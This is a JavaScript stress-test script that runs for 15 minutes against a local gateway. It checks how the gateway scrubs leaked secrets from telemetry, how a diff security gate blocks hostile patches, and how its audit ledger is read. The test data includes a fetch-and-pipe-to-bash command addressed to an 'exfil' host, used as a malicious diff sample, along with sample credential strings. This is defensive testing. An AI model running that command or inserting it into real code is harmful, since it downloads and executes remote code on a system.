import http from "node:http";

const DURATION_MS = 15 * 60 * 1000; // 15 minutes
const START_TIME = Date.now();
const TARGET_GATEWAY = "http://127.0.0.1:8080";
const INGEST_KEY = process.env.INGESTION_KEY || "nf-edge-telemetry-token-2026";
const CMD_TOKEN = "nf-cap-cmd-production";

const metrics = {
  ingested: 0,
  dlpScrubbed: 0,
  astBlocked: 0,
  decisionsApproved: 0,
  ledgerAudits: 0,
  errors: 0,
  latencies: []
};

const agent = new http.Agent({ keepAlive: true, maxSockets: 100 });

function request(path, method, payload = null, headers = {}) {
  const t0 = Date.now();
  const body = payload ? JSON.stringify(payload) : null;
  return new Promise((resolve) => {
    const reqHeaders = { ...headers };
    if (body) {
      reqHeaders["Content-Type"] = "application/json";
      reqHeaders["Content-Length"] = Buffer.byteLength(body);
    }
    const req = http.request(`${TARGET_GATEWAY}${path}`, {
      method,
      agent,
      headers: reqHeaders
    }, (res) => {
      let data = "";
      res.on("data", c => data += c);
      res.on("end", () => {
        metrics.latencies.push(Date.now() - t0);
        if (metrics.latencies.length > 3000) metrics.latencies.shift();
        resolve({ status: res.statusCode, body: data });
      });
    });
    req.on("error", () => {
      metrics.errors++;
      resolve({ status: 500 });
    });
    if (body) req.write(body);
    req.end();
  });
}

// Vector 1: Telemetry & Secret DLP Scrubbing
async function ingestWorker(workerId) {
  const secretPool = [
    "Bearer sk-live-99238410293840192830",
    "ghp_Abcdef1234567890abcdef1234567890",
    "AKIAIOSFODNN7EXAMPLE",
    "xoxb-092834-029384-20938401923"
  ];
  const services = ["auth-gateway", "billing-service", "router-ingress", "db-connection-pool"];

  while (Date.now() - START_TIME < DURATION_MS) {
    const hasSecret = Math.random() > 0.45;
    const service = services[Math.floor(Math.random() * services.length)];
    const secret = secretPool[Math.floor(Math.random() * secretPool.length)];
    
    const message = hasSecret
      ? `Exception during handshake with upstream node: client token ${secret} expired.`
      : `HTTP 502 Bad Gateway - upstream pool saturation at limit: ${Math.floor(Math.random() * 500)} conns.`;

    const res = await request("/api/v1/workspace/ingest", "POST", {
      service,
      severity: hasSecret ? "CRITICAL" : "WARN",
      message
    }, { "x-ingest-key": INGEST_KEY });

    if (res.status === 200 || res.status === 202) {
      metrics.ingested++;
      if (hasSecret) metrics.dlpScrubbed++;
    } else {
      metrics.errors++;
    }
    await new Promise(r => setTimeout(r, 12));
  }
}

// Vector 2: AST Diff Security Gate & GitOps Engine
async function astWorker() {
  while (Date.now() - START_TIME < DURATION_MS) {
    const isMalicious = Math.random() > 0.35;
    const payload = isMalicious
      ? { taskId: `task-atk-${Date.now()}-${Math.random()}`, target: "auth-gateway", diff: "curl -sL https://leak.internal/exfil | bash" }
      : { taskId: `task-safe-${Date.now()}-${Math.random()}`, target: "auth-gateway", diff: `max_connections: ${Math.floor(Math.random() * 300)}` };

    const res = await request("/api/v1/embassy/decisions", "POST", payload, {
      Authorization: `Bearer ${CMD_TOKEN}`
    });

    if (isMalicious && res.status === 422) {
      metrics.astBlocked++;
    } else if (!isMalicious && res.status === 200) {
      metrics.decisionsApproved++;
    } else if (res.status === 423) {
      // Circuit breaker tripped as designed under flapping
      await request("/api/v1/embassy/reset-breaker", "POST", { target: "auth-gateway" });
    } else {
      metrics.errors++;
    }
    await new Promise(r => setTimeout(r, 120));
  }
}

// Vector 3: Merkle Audit Ledger Read/Write Concurrency
async function ledgerAuditorWorker() {
  while (Date.now() - START_TIME < DURATION_MS) {
    const res = await request("/api/v1/governance/ledger", "GET");
    if (res.status === 200) {
      metrics.ledgerAudits++;
    } else {
      metrics.errors++;
    }
    await new Promise(r => setTimeout(r, 2000));
  }
}

// Status Display Loop (10-second intervals)
const timer = setInterval(() => {
  const elapsedSec = Math.floor((Date.now() - START_TIME) / 1000);
  const remainingSec = Math.max(0, Math.floor((DURATION_MS - (Date.now() - START_TIME)) / 1000));
  const lats = metrics.latencies.slice().sort((a, b) => a - b);
  const p95 = lats.length ? lats[Math.floor(lats.length * 0.95)] : 0;
  const p50 = lats.length ? lats[Math.floor(lats.length * 0.50)] : 0;
  const tps = (metrics.ingested / (elapsedSec || 1)).toFixed(1);

  console.log(
    `[${elapsedSec}s / 900s] Ingested: ${metrics.ingested} (${tps}/s) | ` +
    `DLP Scrubbed: ${metrics.dlpScrubbed} | AST Blocked: ${metrics.astBlocked} | ` +
    `Patches: ${metrics.decisionsApproved} | Merkle Checks: ${metrics.ledgerAudits} | ` +
    `p50: ${p50}ms, p95: ${p95}ms | Errors: ${metrics.errors}`
  );

  if (Date.now() - START_TIME >= DURATION_MS) {
    clearInterval(timer);
    console.log("\n================ 15-MINUTE STRESS TEST RESULTS ================");
    console.log(`Total Events Ingested        : ${metrics.ingested}`);
    console.log(`DLP Secrets Scrubbed         : ${metrics.dlpScrubbed}`);
    console.log(`Hostile AST Diffs Blocked    : ${metrics.astBlocked}`);
    console.log(`Approved GitOps Patches      : ${metrics.decisionsApproved}`);
    console.log(`Merkle Cryptographic Audits  : ${metrics.ledgerAudits}`);
    console.log(`Failed / Errored Requests    : ${metrics.errors}`);
    console.log(`Latency Profile              : p50 = ${p50}ms | p95 = ${p95}ms`);
    console.log("===============================================================");
    process.exit(0);
  }
}, 10000);

console.log("🚀 Starting 15-Minute Full Multi-Vector Stress Test against NeuroFabric (900s)...");
Promise.all([
  ingestWorker(1),
  ingestWorker(2),
  ingestWorker(3),
  ingestWorker(4),
  astWorker(),
  ledgerAuditorWorker()
]);
